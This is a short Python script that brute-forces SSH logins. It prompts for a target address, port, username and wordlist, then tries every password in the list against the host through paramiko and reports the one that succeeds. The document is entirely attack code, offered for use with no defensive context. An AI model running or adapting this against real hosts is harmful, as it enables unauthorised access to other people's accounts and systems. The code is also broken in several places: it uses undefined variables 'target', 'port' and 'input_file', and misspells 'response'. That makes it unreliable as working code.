import paramiko
import sys
import os

target_ip = str(input("Target IP-address: "))
target_port = str(input("Target port: "))
username = str(input("Username: "))
password_file = str(input("Wordlist location: "))


def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code


with open(password_file, "r") as file:
    for line in file.readlines():
        password = line.strip()
        try:
            respones = ssh_connect(password)
            if response == 0:
                print("Password found: " + password)
                exit(0)
            elif response == 1:
                print("NULL")
        except Exception as e:
            print(e)
        pass
input_file.close()
